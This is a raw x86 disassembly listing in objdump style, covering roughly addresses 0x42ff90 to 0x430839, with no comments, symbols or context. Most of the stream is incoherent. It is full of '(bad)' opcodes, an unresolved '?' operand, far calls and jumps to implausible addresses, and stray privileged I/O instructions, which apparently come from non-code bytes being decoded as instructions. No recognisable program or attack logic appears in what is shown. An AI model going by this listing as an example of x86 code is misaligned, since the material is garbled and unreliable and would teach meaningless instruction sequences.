  42ff90:	push   eax
  42ff91:	test   DWORD PTR [edx+ebx*4],0x42c1493c
  42ff98:	ds addr16 out 0x6b,eax
  42ff9c:	adc    eax,0x638c27be
  42ffa1:	mov    dh,0x81
  42ffa3:	es into 
  42ffa5:	add    al,0xd7
  42ffa7:	adc    eax,0x8aa4b793
  42ffac:	mov    WORD PTR [ecx],fs
  42ffae:	pushf  
  42ffaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffb0:	pop    eax
  42ffb1:	dec    edi
  42ffb2:	jecxz  0x42ff3a
  42ffb4:	lock cmp BYTE PTR [esp+esi*8+0x1e3b48a0],0x68
  42ffbd:	lds    ecx,FWORD PTR ds:0xeaa84f72
  42ffc3:	push   0x1d51875d
  42ffc8:	cmp    bh,BYTE PTR [eax+0x56]
  42ffcb:	adc    BYTE PTR [ebx],ah
  42ffcd:	fmulp  st(4),st
  42ffcf:	mov    al,ds:0x89e14f6e
  42ffd4:	mov    eax,0xc5ba0b75
  42ffd9:	inc    eax
  42ffda:	(bad)  
  42ffdb:	jne    0x42ffa2
  42ffdd:	mov    ?,WORD PTR [edi+0x3af1a542]
  42ffe3:	pop    esi
  42ffe4:	aaa    
  42ffe5:	push   ds
  42ffe6:	arpl   WORD PTR [edx+0x684a3e55],bx
  42ffec:	xor    BYTE PTR ds:0xb6ead112,0x89
  42fff3:	jae    0x42fff3
  42fff5:	push   0xd202f02e
  42fffa:	in     al,0x33
  42fffc:	popa   
  42fffd:	jp     0x430057
  42ffff:	in     al,dx
  430000:	jmp    0x43005e
  430002:	pop    eax
  430003:	push   edi
  430004:	and    DWORD PTR [ebx-0x79],ecx
  430007:	inc    edi
  430008:	xchg   BYTE PTR [edi+edx*1+0x13],ch
  43000c:	push   esp
  43000d:	xlat   BYTE PTR ds:[ebx]
  43000e:	lds    eax,FWORD PTR [edx+0x59535863]
  430014:	mov    cl,0x84
  430016:	push   edx
  430017:	pop    esi
  430018:	shr    DWORD PTR [ebp-0x41],0x13
  43001c:	inc    ebx
  43001d:	or     cl,BYTE PTR [edx]
  43001f:	out    dx,al
  430020:	push   eax
  430021:	jae    0x42ffad
  430023:	adc    dl,BYTE PTR [esi]
  430025:	mov    cl,0x2a
  430027:	and    DWORD PTR [ebx*1-0x18a9bc28],esp
  43002e:	sub    al,0x15
  430030:	repnz loope 0x430088
  430033:	pop    ecx
  430034:	cwde   
	...
  430095:	add    bh,al
  430097:	ins    DWORD PTR es:[edi],dx
  430098:	aam    0xb5
  43009a:	(bad)  
  43009b:	mov    ebp,0x87aa7fe7
  4300a0:	mov    bl,0x9f
  4300a2:	mov    ss,WORD PTR [ebp+0x32171c5]
  4300a8:	add    al,BYTE PTR [eax]
  4300aa:	inc    esp
  4300ab:	add    BYTE PTR [eax],al
  4300ad:	add    BYTE PTR [eax-0x70],dl
  4300b0:	xor    al,0x57
  4300b2:	fsub   QWORD PTR [ecx+edi*1]
  4300b5:	std    
  4300b6:	mov    edi,0xf714cda0
  4300bb:	adc    al,0x41
  4300bd:	adc    DWORD PTR [ebx-0x18b4749e],0xffffffab
  4300c4:	sti    
  4300c5:	and    eax,0x924af38d
  4300ca:	das    
  4300cb:	and    DWORD PTR [ebp+0x747e6f5],esp
  4300d1:	call   0xb1a4:0xaa019ed0
  4300d8:	cli    
  4300d9:	mov    esi,0xca851f13
  4300de:	or     bh,BYTE PTR [ebx]
  4300e0:	or     edx,DWORD PTR [esi+0x4a]
  4300e3:	jmp    0xb3b3c99e
  4300e8:	gs sub eax,0x4161722b
  4300ee:	dec    esp
  4300ef:	add    eax,ecx
  4300f1:	xchg   BYTE PTR [eax],al
	...
  430113:	add    BYTE PTR [eax],al
  430115:	add    BYTE PTR [ebp+0x55],cl
  430118:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43011e:	mov    esp,ebp
  430120:	or     al,ah
  430122:	dec    ebp
  430123:	add    bh,al
  430125:	add    BYTE PTR [eax],cl
  430127:	add    BYTE PTR [eax],al
  430129:	mov    DWORD PTR [eax],0x3ef44545
  43012f:	xor    eax,0x9c8b8500
  430134:	hlt    
  430135:	clc    
  430136:	retf   
  430137:	(bad)  
  430138:	enter  0x4d45,0xb8
  43013c:	mov    esi,DWORD PTR [esp+esi*8]
  43013f:	test   ebx,ecx
  430141:	pushf  
  430142:	enter  0x4df8,0x8b
  430146:	mov    DWORD PTR [ebp+0x8],0x894708
  43014d:	inc    ebp
  43014e:	mov    ebp,0xff8bfffc
  430153:	dec    ebp
  430154:	mov    ch,0xf4
  430156:	call   DWORD PTR [ebx-0x1]
  430159:	mov    ebx,0x8005322
  43015e:	call   DWORD PTR [ecx+0x8]
  430161:	pop    es
  430162:	jmp    0xb8:0x9cb4533
  430169:	call   0xc3:0x32f4728b
  430170:	call   0x8989:0x3c83203
  430177:	dec    ebp
  430178:	or     ah,al
  43017a:	inc    ebp
  43017b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430181:	xor    eax,DWORD PTR [eax]
  430183:	retf   
  430184:	ret    
  430185:	add    eax,esi
  430187:	enter  0x8945,0x64
  43018b:	dec    ebp
  43018c:	sbb    ah,cl
  43018e:	add    BYTE PTR [ebx-0xb87b277],cl
  430194:	dec    DWORD PTR [ebx-0xbcfb275]
  43019a:	test   DWORD PTR [ebx],esi
  43019c:	dec    ebx
  43019e:	inc    DWORD PTR [ebx]
  4301a0:	inc    eax
  4301a1:	enter  0x8989,0x64
  4301a5:	(bad)  
  4301a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4301aa:	cld    
  4301ab:	dec    DWORD PTR [ebp-0xa90001]
  4301b1:	push   edi
  4301b2:	mov    BYTE PTR [edx+0x1],ch
  4301b5:	and    BYTE PTR [eax],al
  4301b7:	pop    ecx
  4301b8:	inc    ebp
  4301b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4301bf:	push   0xffffff89
  4301c1:	pop    ecx
  4301c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301c3:	dec    ebp
  4301c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301ca:	jne    0x430214
  4301cc:	lea    eax,[eax]
  4301ce:	fs (bad) 
  4301d0:	dec    DWORD PTR [eax]
  4301d2:	mov    DWORD PTR [eax],eax
  4301d4:	test   al,0x0
  4301d6:	add    BYTE PTR [ebp-0x18],cl
  4301d9:	xor    ebp,DWORD PTR [edx]
  4301db:	add    eax,DWORD PTR [eax]
  4301dd:	mov    eax,eax
  4301df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301e6:	inc    ebp
  4301e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ed:	popa   
  4301ee:	mov    esp,DWORD PTR [ebp-0x75]
  4301f1:	(bad)  
  4301f2:	cld    
  4301f3:	inc    eax
  4301f4:	cmp    bh,0x1
  4301f7:	lea    eax,[eax]
  4301f9:	and    BYTE PTR [eax],al
  4301fb:	inc    DWORD PTR [ecx-0x18]
  4301fe:	mov    ecx,DWORD PTR [ebx]
  430200:	cld    
  430201:	add    BYTE PTR [ecx+0x75014d],cl
  430207:	(bad)  
  430208:	xchg   ebp,eax
  430209:	sar    bh,1
  43020b:	inc    eax
  43020c:	inc    DWORD PTR [eax]
  43020e:	mov    eax,DWORD PTR [ebp-0x4]
  430211:	xor    edx,DWORD PTR [edx+0x7201be]
  430217:	add    BYTE PTR [edx],dl
  430219:	(bad)  
  43021a:	nop
  43021b:	inc    ebp
  43021c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430222:	mov    al,0xff
  430224:	add    bh,bh
  430226:	add    BYTE PTR [ebx],dh
  430228:	inc    DWORD PTR [ebx]
  43022a:	sbb    al,0x89
  43022c:	jne    0x43020a
  43022e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430234:	mov    eax,DWORD PTR [ebp-0xff0048]
  43023a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430241:	inc    DWORD PTR [ebp-0x75]
  430244:	(bad)  [esp+ebp*8]
  430247:	test   DWORD PTR [esi-0x1],esp
  43024a:	inc    ebp
  43024b:	(bad)  
  43024c:	aas    
  43024d:	inc    ebp
  43024e:	(bad)  
  43024f:	lea    edi,[eax+edi*2-0x1]
  430253:	inc    edi
  430255:	mov    DWORD PTR [ecx],edi
  430257:	mov    al,ds:0x8b8000c7
  43025c:	out    dx,al
  43025d:	cld    
  43025e:	loopne 0x4301ed
  430260:	inc    ebp
  430261:	(bad)  
  430262:	in     al,dx
  430263:	(bad)  
  430264:	fisttp WORD PTR [eax+0x8801c7]
  43026a:	jecxz  0x4302b1
  43026c:	out    dx,al
  43026d:	inc    DWORD PTR [ebp-0x4]
  430270:	out    0x8d,eax
  430272:	aas    
  430273:	(bad)  
  430274:	call   0xcb2d78
  430279:	add    DWORD PTR [ebx-0x7f590400],ecx
  43027f:	add    BYTE PTR [ecx],al
  430281:	test   DWORD PTR [eax],eax
  430283:	wrmsr  
  430285:	jae    0x430272
  430287:	add    BYTE PTR [eax],al
  430289:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43028f:	add    esp,edi
  430291:	add    BYTE PTR [eax+0x450108],al
  430297:	mov    edi,DWORD PTR [ebp-0x6c]
  43029a:	add    DWORD PTR [eax],0x4
  43029d:	mov    eax,DWORD PTR [ebp+0x3]
  4302a0:	mov    edi,DWORD PTR [esp+edi*8]
  4302a3:	dec    ebp
  4302a4:	nop
  4302a5:	mov    eax,DWORD PTR [ecx]
  4302a7:	fadd   DWORD PTR [eax]
  4302a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4302b0:	inc    ebp
  4302b1:	push   edx
  4302b2:	call   DWORD PTR [ebp-0x7b]
  4302b5:	mov    esi,DWORD PTR [ebp-0x74]
  4302b8:	mov    eax,DWORD PTR [eax]
  4302ba:	cld    
  4302bb:	mov    eax,DWORD PTR [eax+0x880103]
  4302c1:	add    BYTE PTR [ebp+0x6a],bh
  4302c4:	cmp    edi,0x10
  4302c7:	mov    WORD PTR [ebp+0x0],es
  4302ca:	mov    edx,DWORD PTR [edx-0x4]
  4302cd:	push   ecx
  4302ce:	nop
  4302cf:	inc    DWORD PTR [ecx]
  4302d1:	cld    
  4302d2:	add    BYTE PTR [ebp-0x26],bh
  4302d5:	mov    eax,DWORD PTR [eax]
  4302d7:	cld    
  4302d8:	push   eax
  4302d9:	nop
  4302da:	inc    ebp
  4302db:	add    edi,edi
  4302dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4302e3:	call   0x9446ca1b
  4302e8:	cmp    esp,ebx
  4302ea:	movntq QWORD PTR [esi],mm6
  4302ed:	mov    DWORD PTR [eax],0xb87c8b98
  4302f3:	test   ebx,eax
  4302f5:	jmp    DWORD PTR [esi-0x1]
  4302f8:	int    0xe9
  4302fa:	sub    esp,esp
  4302fc:	add    eax,DWORD PTR [ebp-0x30]
  4302ff:	fild   WORD PTR [ebp+0x3f]
  430302:	cmp    eax,edi
  430304:	je     0xc243e726
  43030a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430311:	(bad)  
  430312:	jne    0x4302a0
  430314:	mov    ebx,ecx
  430316:	cld    
  430317:	jl     0x43035e
  430319:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43031f:	inc    ebp
  430320:	call   0xeb2cb0
  430325:	add    BYTE PTR [ebx-0x7f170301],cl
  43032b:	add    DWORD PTR es:[eax],eax
  43032e:	add    al,al
  430330:	xor    BYTE PTR [eax+0x3f],dl
  430333:	inc    ebp
  430334:	add    BYTE PTR [ebx+0xfcd88b],cl
  43033a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430340:	add    DWORD PTR [ecx+0x458be845],ecx
  430346:	fmul   DWORD PTR [ebx+0x8bb800]
  43034c:	cld    
  43034d:	call   0xd82e12
  430352:	dec    DWORD PTR [ebx+0x108ee8ff]
  430358:	add    al,al
  43035a:	push   eax
  43035b:	es inc ebp
  43035d:	inc    ebp
  43035e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430364:	dec    DWORD PTR [ebx-0x3ff70301]
  43036a:	mov    DWORD PTR gs:[eax],eax
  43036d:	call   0x8b6b4932
  430372:	inc    ebp
  430373:	mov    eax,0xe8d8008b
  430378:	add    BYTE PTR [ecx],ch
  43037a:	mov    eax,DWORD PTR [eax]
  43037c:	cld    
  43037d:	mov    eax,eax
  43037f:	call   0x462b13d9
  430384:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43038a:	cld    
  43038b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430392:	xor    BYTE PTR [eax],al
  430394:	push   edi
  430395:	inc    ebp
  430396:	mov    DWORD PTR [ebx],esi
  430398:	in     al,0xb9
  43039a:	inc    ebp
  43039b:	lea    ecx,[ebx-0x3c370301]
  4303a1:	dec    ebp
  4303a2:	call   0x8dc1:0x308328b
  4303a9:	xchg   DWORD PTR [eax+0x1],eax
  4303ac:	inc    DWORD PTR [eax]
  4303ae:	call   0x432cf8
  4303b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4303b9:	jge    0x4303ee
  4303bb:	mov    eax,DWORD PTR [ebx]
  4303bd:	cld    
  4303be:	lea    edx,[eax+0xff0120]
  4303c4:	call   0x432d56
  4303c9:	push   eax
  4303ca:	inc    DWORD PTR [ebp-0x1c]
  4303cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4303d0:	xor    eax,DWORD PTR [eax]
  4303d2:	add    edi,edi
  4303d4:	cmp    ebp,eax
  4303d6:	jne    0x4303fe
  4303d8:	mov    DWORD PTR [eax],0x8b004dd8
  4303de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4303e5:	mov    eax,ebx
  4303e7:	cld    
  4303e8:	test   BYTE PTR [eax+0x32019a],bh
  4303ee:	mov    DWORD PTR [ebp+0x8],esi
  4303f1:	xor    eax,DWORD PTR [ebp-0x73]
  4303f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4303f8:	mov    ebp,eax
  4303fa:	mov    eax,0x33004d29
  4303ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430405:	add    DWORD PTR [eax],eax
  430407:	add    BYTE PTR [ebp+0x30],al
  43040a:	mov    edx,DWORD PTR [edi-0x48]
  43040d:	add    ebx,0xffffffe4
  430410:	test   bp,cx
  430413:	je     0x430440
  430415:	mov    eax,DWORD PTR [ebx]
  430417:	cld    
  430418:	sar    BYTE PTR [eax+0x3b0145],1
  43041e:	pcmpeqw mm4,mm6
  430421:	xor    edi,edi
  430423:	lea    ecx,[ebx-0x239e7470]
  430429:	add    BYTE PTR [ebp+0x50],cl
  43042c:	cmp    eax,DWORD PTR [ebp+0x75]
  43042f:	mov    ebp,DWORD PTR [eax-0x68]
  430432:	test   DWORD PTR [eax],eax
  430434:	clc    
  430435:	push   DWORD PTR [ebp-0x1]
  430438:	lea    ecx,[eax]
  43043a:	int3   
  43043b:	inc    ebp
  43043c:	call   0xfb34cc
  430441:	jne    0x43043b
  430443:	xor    edi,DWORD PTR [ebp-0x41]
  430446:	jmp    0x4304ba
  430448:	mov    eax,DWORD PTR [eax]
  43044a:	mov    eax,0x339545c7
  43044f:	inc    DWORD PTR [ebx]
  430451:	push   DWORD PTR [ecx]
  430453:	xor    eax,0x50eb008b
  430458:	mov    eax,DWORD PTR [ebp-0x3c]
  43045b:	mov    eax,eax
  43045d:	cld    
  43045e:	clc    
  43045f:	ret    
  430460:	test   bh,al
  430462:	pop    es
  430463:	xchg   ebp,eax
  430464:	add    bh,bh
  430466:	inc    ebp
  430467:	dec    DWORD PTR [edi]
  430469:	pop    ds
  43046a:	sub    eax,DWORD PTR [eax]
  43046c:	add    BYTE PTR [eax+0x76],dl
  43046f:	push   ebp
  430470:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430476:	or     al,0xcf
  430478:	inc    eax
  430479:	enter  0x745,0x72
  43047d:	inc    ebp
  43047e:	mov    eax,DWORD PTR [ecx]
  430480:	int3   
  430481:	add    BYTE PTR [ebp-0x75],al
  430484:	xor    eax,0xc74d9cb8
  430489:	xor    edx,eax
  43048b:	lea    eax,[ebp+0x4572f808]
  430491:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430497:	fadd   st,st(6)
  430499:	rol    BYTE PTR [ebp+0x12],0x8b
  43049d:	inc    ebp
  43049e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4304a4:	inc    ebp
  4304a5:	test   bh,al
  4304a7:	call   0xdcf8:0x898532f8
  4304ae:	inc    ebp
  4304af:	inc    ebp
  4304b0:	cmp    esi,DWORD PTR [ebx]
  4304b2:	pushf  
  4304b3:	mov    ecx,0xffb48dc7
  4304b8:	test   eax,ecx
  4304ba:	clc    
  4304bb:	dec    ebp
  4304bc:	inc    ebp
  4304bd:	mov    edi,DWORD PTR [ecx]
  4304bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4304c6:	test   edi,edi
  4304c8:	clc    
  4304c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4304d0:	(bad)  
  4304d1:	enter  0x18e8,0x85
  4304d5:	xor    eax,0xff459cf8
  4304da:	mov    edi,esp
  4304dc:	lock inc ebp
  4304de:	ret    
  4304df:	push   eax
  4304e0:	(bad)  
  4304e1:	idiv   BYTE PTR [ebp+0x0]
  4304e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4304ea:	add    BYTE PTR [ebx],dl
  4304ec:	jmp    0xce063e
  4304f1:	les    eax,FWORD PTR [ebp-0x35]
  4304f4:	mov    ecx,esi
  4304f6:	lock or al,cl
  4304f9:	clc    
  4304fa:	inc    ebp
  4304fb:	add    esi,DWORD PTR [ebx]
  4304fd:	jge    0x430502
  4304ff:	xor    edi,DWORD PTR [ebx]
  430501:	cmp    ecx,DWORD PTR [edi]
  430503:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430508:	mov    edi,DWORD PTR [ecx]
  43050a:	test   al,0xcc
  43050c:	dec    ebp
  43050d:	test   BYTE PTR [ebx],dh
  43050f:	pop    es
  430510:	xor    eax,DWORD PTR [eax]
  430512:	add    ecx,DWORD PTR [esi]
  430514:	add    ecx,eax
  430516:	psraw  mm0,mm1
  430519:	sub    BYTE PTR [ebp+0x38],cl
  43051c:	mov    edi,DWORD PTR [ebx]
  43051e:	lock int3 
  430520:	shl    edx,1
  430522:	rol    BYTE PTR [ebp+0xc],1
  430525:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43052c:	jmp    0x770576
  430531:	pushf  
  430532:	inc    ebp
  430533:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430539:	xor    ecx,ebx
  43053b:	add    ecx,esi
  43053d:	mov    esi,eax
  43053f:	enter  0x45af,0x8b
  430543:	xor    ecx,eax
  430545:	add    edx,DWORD PTR [ebp-0x77]
  430548:	sub    ecx,DWORD PTR [eax]
  43054a:	cmp    eax,DWORD PTR [ebp+0x77]
  43054d:	aad    0x8b
  43054f:	pushf  
  430550:	test   al,0xc7
  430552:	mov    DWORD PTR [eax-0x7747b00],ebp
  430558:	lods   al,BYTE PTR ds:[esi]
  430559:	inc    ebp
  43055a:	dec    ebp
  43055b:	cmp    dh,BYTE PTR [ebx]
  43055d:	pushf  
  43055e:	xor    eax,edi
  430560:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430567:	inc    ebp
  430568:	dec    ebp
  430569:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43056f:	mov    esp,0xf80585d0
  430574:	inc    ebp
  430575:	inc    ebp
  430576:	jmp    0x4305b6
  430578:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43057f:	dec    ebp
  430580:	xor    esi,DWORD PTR [ebx]
  430582:	add    eax,DWORD PTR [ebx]
  430584:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43058a:	dec    ebp
  43058b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430591:	out    dx,eax
  430592:	rol    BYTE PTR [eax],1
  430594:	add    eax,0xebc8458b
  430599:	dec    ebp
  43059a:	mov    ebp,DWORD PTR [ebx]
  43059c:	mov    esp,0x33f84d8b
  4305a1:	ret    
  4305a2:	xor    eax,esi
  4305a4:	add    ecx,eax
  4305a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4305ac:	dec    ebp
  4305ad:	inc    ebp
  4305ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4305b4:	ror    bl,1
  4305b6:	add    eax,0xebc645ce
  4305bb:	scas   eax,DWORD PTR es:[edi]
  4305bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4305c2:	xor    ebp,DWORD PTR [ebx]
  4305c4:	xor    edi,DWORD PTR [ebx]
  4305c6:	add    esi,DWORD PTR [edi+0x3]
  4305c9:	mov    ecx,DWORD PTR [edi]
  4305cb:	clc    
  4305cc:	rol    ebx,0x4d
  4305cf:	(bad)  
  4305d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4305d7:	mov    ah,0x45
  4305d9:	dec    ebp
  4305da:	jbe    0x43060f
  4305dc:	mov    esi,DWORD PTR [ebx]
  4305de:	call   0x334652e6
  4305e3:	rdpmc  
  4305e5:	rol    DWORD PTR [ebx],0x4d
  4305e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305ee:	inc    ebp
  4305ef:	ror    BYTE PTR [ebx+0x45450808],1
  4305f5:	jmp    0x10b0685
  4305fa:	inc    ebp
  4305fb:	inc    ebp
  4305fc:	(bad)  
  4305fd:	mov    ebx,eax
  4305ff:	clc    
  430600:	test   ebx,eax
  430602:	clc    
  430603:	retf   
  430604:	inc    ebp
  430605:	into   
  430606:	mov    esi,0x8b85afec
  43060c:	clc    
  43060d:	enter  0x5545,0x3b
  430611:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430618:	ret    
  430619:	mov    ah,0xc6
  43061b:	addr16 push 0x338b4545
  430621:	clc    
  430622:	add    eax,ebx
  430624:	loopne 0x4305f1
  430626:	dec    ebp
  430627:	into   
  430628:	mov    al,dh
  43062a:	or     BYTE PTR [edi-0x37ff748e],ch
  430630:	inc    ebp
  430631:	push   ebp
  430632:	mov    ebp,DWORD PTR [ebx]
  430634:	in     al,dx
  430635:	cmp    eax,ebx
  430637:	ja     0x43067e
  430639:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43063f:	inc    ebp
  430640:	call   0xd7c3:0x88f8328b
  430647:	retf   
  430648:	inc    ebp
  430649:	into   
  43064a:	mov    eax,esi
  43064c:	in     al,dx
  43064d:	scas   eax,DWORD PTR es:[edi]
  43064e:	retf   
  43064f:	mov    ecx,DWORD PTR [ebp-0x38]
  430652:	mov    edx,DWORD PTR [ebp-0x24]
  430655:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43065c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430663:	mov    eax,DWORD PTR [ebx]
  430665:	clc    
  430666:	loopne 0x43062b
  430668:	push   ebp
  430669:	retf   
  43066a:	mov    dh,al
  43066c:	adc    esi,ecx
  43066e:	jb     0x43061f
  430670:	add    BYTE PTR [ebx+0x558bc845],cl
  430676:	in     al,dx
  430677:	sub    eax,ebx
  430679:	cmp    ecx,ebx
  43067b:	mov    eax,esi
  43067d:	mov    esp,0x45af03ce
  430682:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430688:	mov    eax,ebx
  43068a:	in     al,dx
  43068b:	into   
  43068c:	dec    ebp
  43068d:	(bad)  
  43068e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430694:	rol    DWORD PTR [ebp+0x4d],0x89
  430698:	xor    esp,esp
  43069a:	sub    eax,DWORD PTR [ebp-0x75]
  43069d:	add    ebp,esp
  43069f:	mov    al,0x55
  4306a1:	inc    ebp
  4306a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4306a8:	retf   0x55dc
  4306ab:	inc    ebp
  4306ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4306af:	pushf  
  4306b0:	(bad)  
  4306b1:	(bad)  
  4306b2:	adc    eax,eax
  4306b4:	jb     0x43063b
  4306b6:	add    al,bh
  4306b8:	enter  0x8645,0x33
  4306bc:	inc    DWORD PTR [ebx]
  4306be:	(bad)  
  4306bf:	jmp    0x430706
  4306c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4306c7:	inc    ebp
  4306c8:	(bad)  
  4306c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4306cf:	call   0xb4d:0x88c132cb
  4306d6:	lea    eax,[ebp+0x8]
  4306d9:	xor    esi,DWORD PTR [edx+0x3]
  4306dc:	add    al,ah
  4306de:	inc    ebp
  4306df:	dec    ebp
  4306e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306e6:	data16 add ch,cl
  4306e9:	inc    ebp
  4306ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306f0:	inc    ebp
  4306f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306f7:	push   ebp
  4306f8:	(bad)  
  4306f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4306ff:	add    ch,ch
  430701:	inc    ebp
  430702:	dec    DWORD PTR [ebx-0x34332775]
  430708:	add    al,0x4d
  43070a:	inc    ebp
  43070b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430711:	call   0xc000:0x8b003201
  430718:	add    BYTE PTR [ebp-0x1],cl
  43071b:	xor    ecx,esp
  43071d:	xor    eax,DWORD PTR [eax]
  43071f:	add    edx,DWORD PTR [eax+0x3]
  430722:	mov    DWORD PTR [edi],ecx
  430724:	call   0x4288c7ea
  430729:	mov    DWORD PTR [ebp-0x20],esp
  43072c:	add    BYTE PTR [ebp+0x7d],al
  43072f:	mov    eax,DWORD PTR [eax]
  430731:	in     al,0x15
  430733:	ret    
  430734:	iret   
  430735:	(bad)  
  430736:	enter  0x14af,0x8b
  43073a:	(bad)  
  43073b:	in     al,dx
  43073c:	or     bl,cl
  43073e:	adc    cl,al
  430740:	push   ebp
  430741:	dec    ebp
  430742:	inc    eax
  430743:	mov    edx,DWORD PTR [ebp-0x20]
  430746:	jb     0x430713
  430748:	mov    ecx,esi
  43074a:	cld    
  43074b:	scas   eax,DWORD PTR es:[edi]
  43074c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430753:	mov    BYTE PTR [eax],0x8c
  430756:	push   0xffffff9a
  430758:	push   edi
  430759:	xor    dl,BYTE PTR [eax+0x3b]
  43075c:	mov    ecx,DWORD PTR [edi]
  43075e:	call   0x8c424cc1
  430763:	mov    eax,eax
  430765:	in     al,dx
  430766:	jge    0x4307b5
  430768:	mov    DWORD PTR [ebx],esi
  43076a:	int3   
  43076b:	add    eax,DWORD PTR [ebp+0xf]
  43076e:	xor    eax,ecx
  430770:	(bad)  
  430771:	dec    ebp
  430772:	pushf  
  430773:	xor    ecx,esp
  430775:	add    edi,DWORD PTR [edi]
  430777:	mov    eax,DWORD PTR [ebp-0x38]
  43077a:	aam    0x84
  43077c:	aam    0x9a
  43077e:	add    esi,DWORD PTR [edx]
  430780:	jmp    0x43070b
  430782:	mov    cl,al
  430784:	add    eax,0x14330f45
  430789:	mov    ecx,0xff458d80
  43078e:	jmp    0xc990175b
  430793:	mov    edx,ecx
  430795:	rol    BYTE PTR [ebp+0x330155],1
  43079b:	add    ecx,DWORD PTR [ebp+0xf]
  43079e:	xor    eax,edx
  4307a0:	(bad)  
  4307a1:	ror    DWORD PTR [eax],0x86
  4307a4:	jb     0x4307a3
  4307a6:	add    bh,bh
  4307a8:	clc    
  4307a9:	inc    ebp
  4307aa:	jb     0x430816
  4307ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4307b2:	xor    eax,0xc7d89c8b
  4307b7:	add    al,al
  4307b9:	push   0xf830c3
  4307be:	inc    ebp
  4307bf:	jne    0x4307f6
  4307c1:	push   0xffffff9c
  4307c3:	inc    edi
  4307c5:	adc    al,0xe8
  4307c7:	inc    ebp
  4307c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4307ce:	mov    ecx,DWORD PTR [eax]
  4307d0:	cld    
  4307d1:	or     DWORD PTR [ebp-0x34],0x33
  4307d5:	jbe    0x4307da
  4307d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4307da:	dec    ebp
  4307db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307e1:	mov    BYTE PTR [ebx],dh
  4307e3:	mov    eax,DWORD PTR [ebx]
  4307e5:	or     BYTE PTR [ecx+0x3b],dl
  4307e8:	dec    ebp
  4307e9:	int3   
  4307ea:	xor    ebp,edi
  4307ec:	add    eax,DWORD PTR [ebp+0x51]
  4307ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4307f2:	xor    eax,DWORD PTR [eax]
  4307f4:	add    ebp,DWORD PTR [eax+0x51]
  4307f7:	adc    BYTE PTR [eax+0x0],0x8b
  4307fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430801:	inc    ebp
  430802:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430808:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43080e:	dec    ebp
  43080f:	mov    esi,DWORD PTR [ebx]
  430811:	hlt    
  430812:	add    eax,ebx
  430814:	push   ecx
  430815:	inc    ebp
  430816:	dec    ebp
  430817:	aam    0xff
  430819:	aam    0xe4
  43081b:	(bad)  
  43081c:	retf   
  43081d:	mov    al,ds:0xc1ff39ce
  430822:	adc    al,0xc6
  430824:	inc    ebp
  430825:	and    eax,0x9c0f4c85
  43082a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430831:	cmp    BYTE PTR [ebx+0x39],0x0
  430835:	mov    dh,0xc7
  430837:	cmp    eax,eax
  430839:	jne    0x45440085
